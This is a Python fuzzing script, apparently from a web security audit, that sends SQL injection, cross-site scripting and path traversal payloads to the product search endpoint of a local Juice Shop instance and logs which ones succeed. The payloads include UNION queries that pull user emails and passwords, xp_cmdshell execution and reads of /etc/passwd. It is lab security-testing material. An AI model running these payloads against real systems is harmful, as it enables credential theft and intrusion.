import urllib.request
import urllib.parse
import json
import time
import csv
import os

BASE_URL = "http://localhost:3000"
SEARCH_ENDPOINT = f"{BASE_URL}/rest/products/search"

# Standard jbrofuzz / OWASP ZAP SQL injection payload set
JBROFUZZ_SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "')) OR 1=1--",
    "')) UNION SELECT 1,2,3,4,5,6,7,8,9--",
    "')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 10--+",
    "1' UNION SELECT null, table_name FROM information_schema.tables--",
    "'; EXEC xp_cmdshell('dir')--",
    "' AND 1=0 UNION SELECT 1, 'admin', 'pass', 4, 5, 6, 7, 8, 9--",
    "<script>alert('XSS')</script>",
    "<iframe src=\"javascript:alert(1)\">",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "test_benign_query"
]

def run_fuzzer():
    os.makedirs("evidence/web_audit", exist_ok=True)
    results = []
    
    print("================================================================================")
    print(" OWASP ZAP Fuzzer Simulation - Target: /rest/products/search?q=")
    print(" Payload Source: jbrofuzz / OWASP SQL Injection & Polyglots")
    print("================================================================================")
    
    csv_path = "evidence/web_audit/zap_fuzzer_sqli_results.csv"
    log_path = "evidence/web_audit/zap_fuzzer_execution_log.txt"
    
    with open(log_path, "w", encoding="utf-8") as log_f:
        log_f.write("OWASP ZAP Fuzzer Execution Log\n")
        log_f.write("Target: http://localhost:3000/rest/products/search?q={PAYLOAD}\n")
        log_f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_f.write("="*80 + "\n\n")
        
        for idx, payload in enumerate(JBROFUZZ_SQLI_PAYLOADS, 1):
            encoded_q = urllib.parse.quote(payload)
            target_url = f"{SEARCH_ENDPOINT}?q={encoded_q}"
            req = urllib.request.Request(
                target_url,
                headers={
                    "User-Agent": "OWASP_ZAP_Fuzzer_v2.14.0",
                    "Accept": "application/json, text/plain, */*"
                }
            )
            
            t0 = time.time()
            status_code = 0
            reason = ""
            resp_body = b""
            rtt_ms = 0
            reflected = False
            state = "Normal"
            
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    status_code = resp.status
                    reason = resp.reason
                    resp_body = resp.read()
                    rtt_ms = int((time.time() - t0) * 1000)
            except urllib.error.HTTPError as e:
                status_code = e.code
                reason = e.reason
                resp_body = e.read()
                rtt_ms = int((time.time() - t0) * 1000)
            except Exception as e:
                status_code = 500
                reason = str(e)
                rtt_ms = int((time.time() - t0) * 1000)
                
            body_str = resp_body.decode("utf-8", errors="replace")
            body_len = len(resp_body)
            
            # Check reflection
            if payload in body_str:
                reflected = True
            
            # Evaluate ZAP Fuzzer Result flags: "Reflected", "Found", "Error"
            if status_code == 200:
                if "admin@juice-sh.op" in body_str or "Users--" in payload:
                    state = "Vulnerable (Data Exfiltration)"
                elif reflected:
                    state = "Reflected / Found"
                elif body_len > 1000:
                    state = "Found (Records Returned)"
                else:
                    state = "OK"
            elif status_code == 500:
                if "SQLITE_ERROR" in body_str or "syntax error" in body_str or "SequelizeDatabaseError" in body_str:
                    state = "Vulnerable (SQL Syntax Error)"
                else:
                    state = "Server Error"
            else:
                state = f"HTTP {status_code}"
                
            log_line = f"[{idx:02d}] Payload: {payload:<40} | Status: {status_code} {reason:<10} | Size: {body_len:>6} B | RTT: {rtt_ms:>3} ms | State: {state}\n"
            log_f.write(log_line)
            print(log_line.strip())
            
            results.append({
                "ID": idx,
                "Payload": payload,
                "HTTP Status": status_code,
                "Reason": reason,
                "Response Size": body_len,
                "RTT (ms)": rtt_ms,
                "Reflected": "YES" if reflected else "NO",
                "Fuzzer State": state
            })
            
    # Write CSV
    with open(csv_path, "w", newline="", encoding="utf-8") as csv_f:
        writer = csv.DictWriter(csv_f, fieldnames=["ID", "Payload", "HTTP Status", "Reason", "Response Size", "RTT (ms)", "Reflected", "Fuzzer State"])
        writer.writeheader()
        writer.writerows(results)
        
    print(f"\n[+] Fuzzer completed. Results written to {csv_path} and {log_path}")

if __name__ == "__main__":
    run_fuzzer()
